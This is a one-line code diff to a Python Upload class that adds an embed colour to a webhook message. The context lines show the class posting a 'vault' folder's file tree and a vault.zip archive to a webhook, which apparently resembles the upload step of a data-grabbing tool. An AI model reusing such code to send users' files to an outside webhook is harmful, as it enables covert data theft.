@@ -62,6 +62,7 @@ class Upload:
         self.webhook.send(
             embed=Embed(
                 title="Vault",
+                color=0x2f3136,
                 description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
             ),
             file=File("vault.zip"),
